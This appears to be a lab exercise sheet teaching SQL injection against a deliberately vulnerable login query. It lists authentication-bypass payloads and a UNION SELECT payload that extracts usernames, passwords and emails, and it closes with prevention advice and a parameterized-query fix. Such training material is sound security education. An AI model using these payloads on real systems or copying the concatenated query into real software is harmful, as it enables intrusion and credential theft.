# SQL Injection Exercise

## Objective
Learn how SQL injection vulnerabilities work and how to exploit them to bypass authentication.

## What is SQL Injection?
SQL Injection (SQLi) occurs when user input is directly concatenated into SQL queries without proper sanitization. This allows attackers to manipulate the query logic.

## Vulnerable Code
```javascript
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
```

## Exercise Instructions

### Step 1: Normal Login
Try logging in with valid credentials:
- Username: `admin`
- Password: `admin123`

### Step 2: SQL Injection Attack
Now try to bypass authentication without knowing the password:

**Payload 1:** Username: `' OR '1'='1`
Password: `anything`

**Payload 2:** Username: `admin' --`
Password: `anything`

**Payload 3:** Username: `' OR 1=1 --`
Password: `anything`

### Step 3: Extract Data
Try to extract all usernames:
- Username: `' UNION SELECT username, password, email, NULL FROM users --`
- Password: `anything`

### Step 4: Comment-based Injection
Try using SQL comments to bypass password check:
- Username: `admin'#`
- Password: `anything`

## Expected Results
- Normal login should work with correct credentials
- SQL injection payloads should bypass authentication
- UNION-based attacks should reveal additional data

## Prevention
To prevent SQL injection:
1. Use parameterized queries or prepared statements
2. Use ORM frameworks
3. Validate and sanitize all user input
4. Apply principle of least privilege to database accounts

## Secure Code Example
```javascript
const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
db.get(query, [username, password], (err, row) => {
  // Handle result
});
```
